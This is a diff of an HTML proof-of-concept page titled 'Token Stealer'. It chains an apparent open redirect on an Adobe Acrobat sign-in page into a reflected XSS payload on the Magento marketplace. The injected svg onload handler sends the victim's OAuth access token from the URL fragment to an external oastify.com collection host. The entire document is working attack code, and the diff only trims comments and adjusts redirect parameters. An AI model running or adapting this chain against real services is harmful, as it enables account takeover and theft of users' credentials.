@@ -1,21 +1,20 @@
 <!DOCTYPE html>
 <html>
-<head><title>Redirecting...</title></head>
+<head><title>Token Stealer</title></head>
 <body>
 <script>
-  // Grab the OAuth access token from the URL fragment
   const token = window.location.hash;
 
-  // Build the malicious Magento XSS payload
-  const target = "https://marketplace.magento.com/extensions.html?p=2%22%3E" +
-                 "<svg/onload=fetch('https://hdyvx8deiqq1jmkws8zjcta2ctil6du2.oastify.com/?token=" +
-                 encodeURIComponent(token) + "')>";
+  const xss = "https://marketplace.magento.com/extensions.html?p=2%22%3E" +
+              "<svg/onload=fetch('https://lwlzgcwi1u952q30bcinvxt6vx1ppgd5.oastify.com?token=" +
+              encodeURIComponent(token) + "')>";
 
-  // Use Acrobat's open redirect to forward to Magento
-  const acrobatRedirect = "https://acrobat.adobe.com/dc-chrome-extension/sign-in.html?pdfUrl=" + encodeURIComponent(target);
+  const redirect = "https://acrobat.adobe.com/dc-chrome-extension/sign-in.html?main_op=googleSignIn" +
+                   "&source=ContinueWithGoogle%3AEmbedViewer&application=google&locale=en-GB" +
+                   "&callingApp=efaidnbmnnnibpcajpcglclefindmkaj&pdfUrl=" + encodeURIComponent(xss);
 
-  // Redirect the victim to trigger the XSS with the token
-  window.location.href = acrobatRedirect;
+  window.location.href = redirect;
 </script>
 </body>
 </html>
+
